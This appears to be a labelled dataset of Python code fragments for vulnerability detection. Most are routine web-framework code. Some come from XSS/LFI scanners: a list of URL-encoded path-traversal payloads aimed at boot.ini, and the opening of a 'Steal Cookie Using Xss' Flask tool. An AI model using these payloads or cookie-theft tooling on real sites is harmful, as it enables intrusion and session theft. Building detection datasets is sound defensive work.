15593, "code": " msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note", "label": 0}, {"snippet_id": 54447, "code": " Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\", background='light sky blue').grid(row=12,column=1)", "label": 0}, {"snippet_id": 30912, "code": " +\"-\" +funct.get_data('config') +\".cfg\" \t\tfunct.get_config(serv, cfg) \telse: \t\tcfg=hap_configs_dir +form.getvalue('configver') \t\t\t \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert", "label": 0}, {"snippet_id": 43133, "code": " \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname", "label": 0}, {"snippet_id": 48496, "code": "%20provided\") current_reservation=GroupReservation.objects.get(id=int(request.GET[\"payload\"])) if current_reservation.createdByUser !=u and u. rights < 2: return HttpResponseRedirect(\"/admin?error=noyb", "label": 0}, {"snippet_id": 47729, "code": " return False if pw1.isupper(): return False if pw1.islower(): return False return True def recreate_form(reason: str): return redirect('/admin/users/edit?fault=' +str(reason)) def action_save_user(request", "label": 0}, {"snippet_id": 43513, "code": " raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception", "label": 0}, {"snippet_id": 2412, "code": " import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[]", "label": 0}, {"snippet_id": 47282, "code": "==200 with patch('invenio_records.models.RecordMetadata') as db_mock: db_mock.side_effect=SQLAlchemyError() res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code", "label": 0}, {"snippet_id": 14465, "code": "'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights", "label": 0}, {"snippet_id": 4555, "code": "'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', ", "label": 0}, {"snippet_id": 2411, "code": " import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=", "label": 0}, {"snippet_id": 49925, "code": " on http://localhost:4001/webclient.) /webclient -this url is handled through django's template system and serves the html page for the client itself along with its javascript chat program. /webclientdata", "label": 0}, {"snippet_id": 17865, "code": "'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render", "label": 0}, {"snippet_id": 12398, "code": "='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 21001, "code": ".MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme", "label": 0}, {"snippet_id": 16634, "code": ", name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views", "label": 0}, {"snippet_id": 12468, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 43791, "code": " in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr", "label": 0}, {"snippet_id": 24198, "code": " suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir", "label": 0}, {"snippet_id": 6381, "code": " def static_dir(self): \"\"\" Directory with static files to be served. \"\"\" return self.config.get(self.section, 'static_dir') @property def ssl_adapter(self): \"\"\" CherryPy SSL adapter class to use(must be", "label": 0}, {"snippet_id": 18915, "code": "'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider", "label": 0}, {"snippet_id": 14142, "code": "<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax',", "label": 0}, {"snippet_id": 20348, "code": "\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class", "label": 0}, {"snippet_id": 42954, "code": ".is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t", "label": 0}, {"snippet_id": 22837, "code": "?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook", "label": 1}, {"snippet_id": 27123, "code": " 0: check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) params=", "label": 1}, {"snippet_id": 24311, "code": " log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up", "label": 0}, {"snippet_id": 44016, "code": "\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak ", "label": 0}, {"snippet_id": 47974, "code": ".management.magic import compile_markdown, get_current_user import logging import ntpath import os import math import PIL from PIL import Image PATH_TO_UPLOAD_FOLDER_ON_DISK: str=\"/usr/local/www/focweb", "label": 0}, {"snippet_id": 6656, "code": " list of usernames :rtype: list[string] \"\"\" if self._parsed_status_test_usernames: return self._parsed_status_test_usernames value=self.config.get(self.section, 'status_test_usernames') res=[x.strip() for", "label": 0}, {"snippet_id": 37625, "code": " route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append(", "label": 0}, {"snippet_id": 14556, "code": " pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name,", "label": 1}, {"snippet_id": 50689, "code": ".disconnect(self) def at_login(self): csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=self.uid csession.save() def data_out(self, **kwargs): \"\"\" Data Evennia -> User", "label": 0}, {"snippet_id": 51465, "code": ".humanize', 'django_celery_beat', 'compressor', 'websecmap.app', 'websecmap.organizations', 'websecmap.scanners', 'websecmap.reporting', 'websecmap.map', 'websecmap.pro', 'dashboard.internet_nl_dashboard',", "label": 0}, {"snippet_id": 16947, "code": "<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading',", "label": 0}, {"snippet_id": 23223, "code": ")/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views", "label": 0}, {"snippet_id": 25722, "code": "=q.help_text, initial=initial.answer if initial else None, min_value=Decimal('0.00'), ) elif q.type==Question.TYPE_STRING: field=forms.CharField( label=q.question, required=q.required, help_text=help_text", "label": 0}, {"snippet_id": 16307, "code": "=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'", "label": 0}, {"snippet_id": 14066, "code": ">[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$", "label": 0}, {"snippet_id": 38208, "code": "=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"", "label": 0}, {"snippet_id": 45271, "code": ", uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc", "label": 0}, {"snippet_id": 3893, "code": "(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", ", "label": 0}, {"snippet_id": 14377, "code": " ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION')", "label": 0}, {"snippet_id": 55110, "code": " locale=locale) or readonly_exists(projects, locale) ): return HttpResponseForbidden( \"Forbidden: You don't have permission for batch editing\" ) active_translations=Translation.objects.filter( active=True", "label": 0}, {"snippet_id": 10094, "code": "): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual", "label": 0}, {"snippet_id": 14686, "code": " name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{", "label": 0}, {"snippet_id": 7124, "code": "/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done", "label": 0}, {"snippet_id": 12, "code": " urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[]", "label": 0}, {"snippet_id": 33243, "code": "%d not found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask(webapp2.RequestHandler): \"\"\"Cancels a swarming task.\"\"\" @decorators.require_taskqueue('backend", "label": 0}, {"snippet_id": 35548, "code": ".fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif", "label": 0}, {"snippet_id": 27626, "code": ", 403) def _add_security_response_headers(self): \"\"\"Add security-related headers to response.\"\"\" self.response.headers['Strict-Transport-Security']=( 'max-age=2592000; includeSubdomains') self.response", "label": 0}, {"snippet_id": 11045, "code": ".default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example,", "label": 0}, {"snippet_id": 39968, "code": ".fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants", "label": 0}, {"snippet_id": 16629, "code": "[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"", "label": 0}, {"snippet_id": 29347, "code": " sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path')] \t\telse: \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +", "label": 0}, {"snippet_id": 38821, "code": "\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue", "label": 0}, {"snippet_id": 23970, "code": "}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string", "label": 0}, {"snippet_id": 6300, "code": " return self.config.getboolean(self.section, 'syslog_debug') @property def listen_addr(self): \"\"\" IP address to listen on. \"\"\" return self.config.get(self.section, 'listen_addr') @property def listen_port", "label": 0}, {"snippet_id": 46479, "code": ") def no_collections(request): return render('no_collections.mako', request,{'is_embeddable': request.GET.get('is_embeddable', False)}) def admin_collections(request, is_redirect=False, is_mobile=False", "label": 0}, {"snippet_id": 36457, "code": " df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in", "label": 0}, {"snippet_id": 49995, "code": ".utils.ansi import parse_ansi from evennia.utils import utils from evennia.utils.text2html import parse_html from evennia.server import session _CLIENT_SESSIONS=utils.mod_import(settings.SESSION_ENGINE)", "label": 0}, {"snippet_id": 22792, "code": "/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index')", "label": 1}, {"snippet_id": 6920, "code": ", include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 14498, "code": "'ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 12765, "code": "', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login", "label": 0}, {"snippet_id": 4669, "code": " 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration", "label": 0}, {"snippet_id": 11545, "code": "(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change", "label": 0}, {"snippet_id": 14213, "code": "/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine", "label": 0}, {"snippet_id": 22579, "code": " wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'", "label": 0}, {"snippet_id": 9759, "code": "/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider", "label": 0}, {"snippet_id": 44246, "code": ", find_dollar_braced_variables LOG=logging.getLogger(__name__) def list_editor_workflows(request): workflows=[d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra", "label": 0}, {"snippet_id": 19842, "code": "//nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests", "label": 0}, {"snippet_id": 25058, "code": ", \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing", "label": 0}, {"snippet_id": 44583, "code": "=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows=[node['properties']['workflow'] for node in workflow['nodes'] if node['type']=='subworkflow-widget'] if subworkflows:", "label": 0}, {"snippet_id": 595, "code": " if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url", "label": 0}, {"snippet_id": 47816, "code": "\"display_name\"]) dect=int(request.POST[\"dect\"]) notes=str(request.POST[\"notes\"]) pw1=str(request.POST[\"password\"]) pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[", "label": 0}, {"snippet_id": 38337, "code": "\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder", "label": 0}, {"snippet_id": 36872, "code": "(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title", "label": 0}, {"snippet_id": 4080, "code": " result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}", "label": 0}, {"snippet_id": 11263, "code": " pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course", "label": 0}, {"snippet_id": 28511, "code": "\\n\" \t\tlog=open(log_path +\"/metrics-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('keep_alive')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/keep_alive-\"+get_data('logs')+\"", "label": 0}, {"snippet_id": 26786, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 8057, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax", "label": 0}, {"snippet_id": 20953, "code": "'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-", "label": 0}, {"snippet_id": 47459, "code": "]))) elif http_request.GET.get('fault'): f.add_content(PlainText(\"Unable to add user due to: \" +str(http_request.GET['fault']))) current_user: Profile=get_current_user(http_request) if current_user.rights", "label": 0}, {"snippet_id": 36218, "code": ".meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) ", "label": 0}, {"snippet_id": 7429, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)", "label": 0}, {"snippet_id": 44534, "code": "(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id", "label": 0}, {"snippet_id": 42849, "code": "{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t", "label": 0}, {"snippet_id": 33266, "code": ", task_id): swarming.cancel_task(host, task_id) class UnregisterBuilders(webapp2.RequestHandler): \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\" @decorators.require_cronjob def get", "label": 0}, {"snippet_id": 1843, "code": " res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8')", "label": 0}, {"snippet_id": 43631, "code": " \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False", "label": 0}, {"snippet_id": 16613, "code": "(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$", "label": 0}, {"snippet_id": 4624, "code": "'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc", "label": 0}, {"snippet_id": 1753, "code": "'GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page", "label": 0}, {"snippet_id": 14767, "code": "._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite(''", "label": 0}, {"snippet_id": 18526, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 16827, "code": "*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware", "label": 1}, {"snippet_id": 34636, "code": "(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None", "label": 0}, {"snippet_id": 41131, "code": "\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category", "label": 0}, {"snippet_id": 42745, "code": "}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent", "label": 0}, {"snippet_id": 42521, "code": "\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t", "label": 0}, {"snippet_id": 26147, "code": " scheme=event.settings.name_scheme, label=_('Name'), initial=(self.instance.name_parts if self.instance else self.instance.name_parts), ) if event.settings.invoice_address_required and not event.settings", "label": 0}, {"snippet_id": 51989, "code": ".translation import ugettext as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client", "label": 0}, {"snippet_id": 16955, "code": "='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 26281, "code": "): raise ValidationError(_('Your VAT ID does not match the selected country.')) try: result=vat_moss.id.validate(data.get('vat_id')) if result: country_code, normalized_id, company_name=result self.instance", "label": 0}, {"snippet_id": 53893, "code": " sleep print('\\n\\t[ Steal Cookie Using Xss..]\\n\\n') print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^", "label": 1}, {"snippet_id": 1970, "code": "(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={", "label": 0}, {"snippet_id": 39538, "code": ".fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))", "label": 0}, {"snippet_id": 45206, "code": "'editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc", "label": 1}, {"snippet_id": 37478, "code": " \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger", "label": 0}, {"snippet_id": 35482, "code": "(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit", "label": 0}, {"snippet_id": 39131, "code": "\"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self", "label": 0}, {"snippet_id": 52868, "code": " return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with url' in str(detail): detail='%s: %s' %(_('The Oozie server is not running'), detail)", "label": 0}, {"snippet_id": 50230, "code": "\" if csessid in self.requests: self.requests[csessid].finish() del self.requests[csessid] if csessid in self.databuffer: del self.databuffer[csessid] def mode_init(self, request): \"\"\" This is called by", "label": 0}, {"snippet_id": 17384, "code": ", name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views", "label": 0}, {"snippet_id": 26918, "code": "(params)): if j==i: post_params[params[j]]=xss else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len(hidden_param_name))", "label": 0}, {"snippet_id": 5302, "code": "'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', ", "label": 0}, {"snippet_id": 1334, "code": "=None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data 